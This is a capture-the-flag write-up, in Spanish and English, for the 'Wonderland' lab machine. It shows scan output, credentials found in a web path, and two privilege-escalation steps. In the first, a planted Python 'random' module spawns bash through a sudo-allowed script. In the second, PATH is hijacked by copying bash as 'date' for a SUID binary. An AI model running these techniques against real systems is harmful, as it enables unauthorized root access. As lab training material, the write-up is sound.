# Wonderland

## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.

```
## Enum
### HTPP 
#### Gobusting
```
/img
/poem
/r/a/b/b/i/t <- alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

## Privesc
Con estas creds estamos logeados como alice
### Alice
```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
El script al que llamamos tiene la siguiente estructura
```
import random
# poem
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
Creemos un modulo de python llamado random con la siguiente función
```
import os

def choice(string):
	os.system("/bin/bash")
```

Con esto en la carpeta en la que estamos lanzamos el siguiente comando
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
### Rabbit
#### SUID
```
/home/rabbit/teaParty
```
Este binario es extraño y tiene el SUID de hatter, corramoslo con ltrace
```
ltrace ./teaParty
setuid(1003)                                                                              = -1
setgid(1003)                                                                              = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)                                              = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Thu, 20 Aug 2020 20:38:38 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                    = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)                                               = 69
getchar(1, 0x560b3f0c5260, 0x7f59805288c0, 0x7f598024b154
)                                = 10
puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
)                                               = 33
+++ exited (status 33) +++
```
La llamada al sistema es interesante, aunque no se muestra entera, veamosla con cat
```
/bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, and I will give you some tea while you wait for him
```
Se llama a date sin especificar la ruta, ahi tenemos nuestro punto de fallo
```
rabbit@wonderland:/home/rabbit$ mkdir tools
rabbit@wonderland:/home/rabbit$ cd tools
rabbit@wonderland:/home/rabbit/tools$ cp /bin/bash date
rabbit@wonderland:/home/rabbit/tools$ PATH=$PWD:$PATH

```
